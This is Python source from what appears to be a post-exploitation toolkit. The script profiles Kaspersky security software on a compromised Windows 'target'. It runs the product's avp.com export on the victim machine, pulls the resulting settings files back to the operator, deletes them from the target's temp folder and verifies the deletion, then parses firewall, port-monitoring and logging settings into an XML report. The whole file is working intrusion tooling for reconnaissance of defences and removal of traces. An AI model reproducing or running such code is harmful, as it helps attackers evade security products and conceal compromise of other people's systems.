
import dsz, dsz.lp, dsz.env, dsz.file, shutil, subprocess, re, StringIO, datetime, binascii, shared

def kasVerNine(kasName, kasDescription, kasVersion, kasRoot):
    if re.match('.*ANTI.*', kasName.upper()):
        shared.safePrint('|   IT APPEARS TO BE ANTI-VIRUS ONLY...  YOU DO NOT NEED ME.')
        shared.safePrint('+---------------------------------------------------------------------------------')
        kasFlavor = 'ANTIVIRUS'
    else:
        kasFlavor = 'SECURITY'
        shared.safePrint('|   IT APPEARS TO BE INTERNET SECURITY...')
        logDir = dsz.lp.GetLogsDirectory()
        kasXmlFilePtr = open((logDir + '\\kasperskyfile.xml'), 'w')
        shared.safePrint('|   THIS NEW VERSION OF THE KASPERSKY 2010 SCRIPT USES DATA RETRIEVED FROM THE')
        shared.safePrint('|   ACTUAL KASPERSKY PROCESS; IT DOES NOT QUERY THE REGISTRY ANYMORE.')
        shared.safePrint('|   THIS MEANS THAT WE WILL CREATE TWO FILES ON TARGET, DOWNLOAD THEM, AND DELETE')
        shared.safePrint('|   THEM.  PLEASE ENSURE THAT THE SCRIPT REMOVES THE FILES CORRECTLY.')
        shared.safePrint('|   GENERALLY SPEAKING, THESE FILES COMBINED ARE TYPICALLY LESS THAN 250K.')
        shared.safePrint('|   IF THERE IS A GOOD REASON NOT TO CREATE AND DOWNLOAD THESE FILES, PLEASE')
        shared.safePrint('|   QUIT OUT OF THIS SCRIPT AND MANUALLY CHECK REGISTRY SETTINGS.')
        shared.safePrint('+---------------------------------------------------------------------------------')
        dsz.ui.Pause('DO YOU WISH TO CONTINUE AND CREATE/GET THE KASPERSKY SETTINGS FILES? (REQUIRED TO CONTINUE)')
        (tarWinDir, tarSysDir) = dsz.path.windows.GetSystemPaths()
        tarTempDir = (tarWinDir + '\\temp')
        kasOutFile = '~klset.dat'
        dsz.control.echo.Off()
        tempFileName = ''
        for i in range(2):
            if dsz.file.Exists(kasOutFile, tarTempDir):
                shared.safePrint('+---------------------------------------------------------------------------------')
                shared.safePrint(('|\t!!!FILE %s\\%s MAY ALREADY EXIST ON TARGET!!!' % (tarTempDir, kasOutFile)))
                shared.safePrint('|\t!!!SEEK HELP IMMEDIATELY!!!   !!!BAILING FROM SCRIPT!!!')
                shared.safePrint('|\t!!!SEE BELOW DIR COMMAND OUTPUT!!!')
                shared.safePrint('+---------------------------------------------------------------------------------')
                dsz.control.echo.On()
                dsz.cmd.Run(((('dir ' + tarTempDir) + '\\') + kasOutFile))
                dsz.control.echo.Off()
                return False
            else:
                shared.safePrint('+---------------------------------------------------------------------------------')
                if dsz.cmd.Run((((((('run -command "\\"' + kasRoot) + '\\avp.com\\" export rtp \\"') + tarTempDir) + '\\') + kasOutFile) + '\\"" -redirect')):
                    shared.safePrint(('|    SUCCESSFULLY CREATED %s ON TARGET' % kasOutFile))
                    dsz.cmd.Run(((('foreground get ' + tarTempDir) + '\\') + kasOutFile), dsz.RUN_FLAG_RECORD)
                    [getFile] = dsz.cmd.data.Get('filelocalname::localname', dsz.TYPE_STRING)
                if dsz.cmd.Run(((('del ' + tarTempDir) + '\\') + kasOutFile)):
                    shared.safePrint(('|    SUCCESSFULLY DELETED %s FROM TARGET' % kasOutFile))
                    if dsz.file.Exists(kasOutFile, tarTempDir):
                        shared.safePrint(('PLEASE CHECK THE STATUS OF THE FILE %s/%s ON TARGET!!!' % (tarTempDir, kasOutFile)))
                    else:
                        shared.safePrint(('|    VERIFIED DELETION OF FILE %s\\%s FROM TARGET' % (tarTempDir, kasOutFile)))
                        if (dsz.cmd.Run(((('dir ' + tarTempDir) + '\\') + kasOutFile)) != True):
                            shared.safePrint('DIRECTORY LISTING FAILED')
                        dsz.control.echo.Off()
                else:
                    shared.safePrint(('FAILED TO DELETE %s FROM TARGET' % kasOutFile))
                    dsz.ui.Pause(('!!! VERIFY THAT THE FILE %s\\%s IS NOT ON TARGET!!!' % (tarTempDir, kasOutFile)))
            kasOutFile = '~klset.txt'
        shared.safePrint('+---------------------------------------------------------------------------------')
        dsz.ui.Pause('PLEASE CHECK THE ABOVE DIRECTORY OUTPUTS TO ENSURE BOTH FILES WERE SUCCESSFULLY DELETED.')
        try:
            kasXmlFilePtr.write('<kaspersky_settings>\n')
            kasXmlFilePtr.write('<vendor>KASPERSKY</vendor>\n')
            kasXmlFilePtr.write((('<version>' + shared.xmlScrub(kasVersion)) + '</version>\n'))
            kasXmlFilePtr.write((('<description>' + shared.xmlScrub(kasName)) + '</description>\n'))
            kasXmlFilePtr.write((('<root>' + shared.xmlScrub(kasRoot)) + '</root>\n'))
            shared.safePrint('+---------------------------------------------------------------------------------')
            shared.safePrint('|  THE SCRIPT HAS IDENTIFIED KASPERSKY VERSION 9 (AKA 2010)...')
            shared.safePrint(((('|  ATTEMPTING TO OPEN FILE: ' + logDir) + '\\GetFiles\\') + getFile))
            kasFilePtr = open(((logDir + '\\GetFiles\\') + getFile))
            fwLevel = 0
            fmLevel = 0
            inRegGuard = 0
            fireWallStatus = 'UNKNOWN'
            allPortMonitoring = 'UNKNOWN'
            fileSystemMonitor = 'UNKNOWN'
            logRegEvents = 'UNKNOWN'
            logNonCrit = 'UNKNOWN'
            sysAccountWatch = 'UNKNOWN'
            try:
                for line in kasFilePtr:
                    if re.match('.*bWatchSystemAccount.*', line):
                        sysAccountWatch = 'ENABLED'
                        if re.match('.*no.*', line):
                            sysAccountWatch = 'DISABLED'
                        kasXmlFilePtr.write((('<sys_acc_watch>' + shared.xmlScrub(sysAccountWatch)) + '</sys_acc_watch>\n'))
                    if re.match('.*LogFiles.*', line):
                        fileSystemMonitor = 'ENABLED'
                        if re.match('.*no.*', line):
                            fileSystemMonitor = 'DISABLED'
                        kasXmlFilePtr.write((('<file_sys_logging>' + shared.xmlScrub(fileSystemMonitor)) + '</file_sys_logging>\n'))
                    if re.match('.*LogReg.*', line):
                        logRegEvents = 'ENABLED'
                        if re.match('.*no.*', line):
                            logRegEvents = 'DISABLED'
                        kasXmlFilePtr.write((('<reg_event_logging>' + shared.xmlScrub(logRegEvents)) + '</reg_event_logging>\n'))
                    if re.match('.*FullReport.*', line):
                        logNonCrit = 'ENABLED'
                        if re.match('.*no.*', line):
                            logNonCrit = 'DISABLED'
                        kasXmlFilePtr.write((('<noncrit_event_logging>' + shared.xmlScrub(logNonCrit)) + '</noncrit_event_logging>\n'))
                    if re.match('.*[+].*Firewall.$.*', line):
                        fwLevel = 1
                    if ((1 == fwLevel) and re.match('.*enabled.*', line)):
                        if re.match('.*no.*', line):
                            fireWallStatus = 'DISABLED'
                        else:
                            fireWallStatus = 'ENABLED'
                        kasXmlFilePtr.write((('<firewall_status>' + shared.xmlScrub(fireWallStatus)) + '</firewall_status>\n'))
                        fwLevel = 0
                    if re.match('.*AllPorts.*', line):
                        if re.match('.*yes.*', line):
                            allPortMonitoring = 'ENABLED'
                        else:
                            allPortMonitoring = 'DISABLED'
                    if re.match('.*vRuleList_vcontent.*', line):
                        splitFw = line.split(' ')
                        fwActionBlock = splitFw[2]
                    m = re.match('.*?([0-9a-fA-F]{4}07268930.*0801816089).*?', line)
                    if m:
                        fwRules = m.group(1)
                        shared.lateKasFw(fwRules, kasXmlFilePtr, fwActionBlock)
                    if re.match('.*[+].*Resource.$.*', line):
                        inRegGuard = 1
                    if (re.match('.*Childs_vcontent.*', line) and (inRegGuard == 1)):
                        shared.lateKasRegRules(line, kasXmlFilePtr)
                        inRegGuard = 0
                    if re.match('.*4b4c41707054727573746564.*', line):
                        shared.lateKasAppRules(line, kasXmlFilePtr)
                    if re.match('.*Ports_vcontent.*', line):
                        shared.lateKasPortMon(line, kasXmlFilePtr)
                kasXmlFilePtr.write((('<allport_monitoring>' + allPortMonitoring) + '</allport_monitoring>'))
                shared.safePrint('+----------------------------------------------------------------------------------+')
                shared.safePrint('| GENERAL PSP STATUS:                                                              |')
                shared.safePrint('+----------------------------------------------------------------------------------+')
                shared.safePrint(('|      FIREWALL IS:                       %s' % fireWallStatus))
                shared.safePrint(('|      PORT MONITORING ON ALL PORTS IS:   %s' % allPortMonitoring))
                shared.safePrint(('|      FILE SYSTEM MONITORING:            %s' % fileSystemMonitor))
                shared.safePrint(('|      SYSTEM ACCOUNT WATCHING IS:        %s' % sysAccountWatch))
                shared.safePrint(('|      NON-CRITICAL EVENT LOGGING IS:     %s' % logNonCrit))
                shared.safePrint(('|      LOGGING OF REGISTRY EVENTS IS:     %s' % logRegEvents))
                shared.safePrint('+----------------------------------------------------------------------------------+')
            finally:
                kasFilePtr.close()
        finally:
            kasXmlFilePtr.write('</kaspersky_settings>\n')
            kasXmlFilePtr.close()
    return True